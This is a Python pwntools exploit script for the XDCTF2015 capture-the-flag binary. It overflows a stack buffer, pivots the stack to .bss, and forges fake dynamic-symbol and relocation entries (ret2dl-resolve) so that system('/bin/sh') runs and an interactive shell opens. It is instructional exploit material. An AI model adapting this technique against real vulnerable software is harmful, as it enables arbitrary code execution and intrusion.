from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment
# new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
## padding
rop.raw('a' * offset)
## read 100 byte to base_stage
rop.read(0, base_stage, 100)
## stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

## making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
# plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])

## making fake write relocation

# making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])

rop.raw(plt0)
rop.raw(index_offset)
# fake ret addr of write
rop.raw('bbbb')
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
